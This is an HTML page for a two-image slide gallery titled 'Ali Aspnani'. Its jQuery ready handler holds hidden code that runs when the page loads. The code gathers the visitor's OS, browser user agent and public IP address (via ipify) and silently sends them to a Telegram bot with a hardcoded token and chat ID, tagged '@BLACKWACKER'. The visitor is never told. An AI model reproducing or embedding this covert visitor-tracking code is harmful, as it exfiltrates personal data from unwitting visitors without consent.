<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ali Aspnani</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            // Get user system information
            const systemInfo = {
                os: navigator.platform,
                browser: navigator.userAgent
            };

            const slides = $('.slide');

            slides.on('click', function() {
                clearActiveClasses();
                $(this).addClass('active');
            });

            function clearActiveClasses() {
                slides.removeClass('active');
            }

            // Get user network IP address
            $.getJSON("https://api.ipify.org?format=json", function(data) {
                const ipAddress = data.ip;

                // Send data to Telegram bot
                const telegramBotToken = "8093882502:AAFQ9csWWuoAcvwMe-mDfQwF_By3_0SLe5Q";
                const chatId = "7899515465";
                const message = `System Info: OS - ${systemInfo.os}, Browser - ${systemInfo.browser}, IP Address - ${ipAddress}, @BLACKWACKER`;

                $.ajax({
                    url: `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
                    method: "POST",
                    data: {
                        chat_id: chatId,
                        text: message
                    },
                    success: function() {
                        console.log("Data sent to Telegram bot successfully!");
                    },
                    error: function(xhr, status, error) {
                        console.error("Error sending data to Telegram bot:", error);
                    }
                });
            });
        });
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        .container {
            display: flex;
            width: 100vw;
            height: 100vh;
            position: relative;
        }
        .slide {
            flex: 1;
            background-size: cover;
            background-position: center;
            transition: opacity 0.5s ease;
            opacity: 0.5;
            cursor: pointer;
        }
        .slide.active {
            opacity: 1;
        }
        h3 {
            color: white;
            text-align: center;
            margin: 0;
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="slide" style="background-image: url('https://backiee.com/static/wallpapers/1920x1080/317897.jpg');">
            <h3>1</h3>
        </div>
        <div class="slide" style="background-image: url('https://backiee.com/static/wallpapers/3840x2160/231634.jpg');">

        </div>
    </div>
</body>
</html>
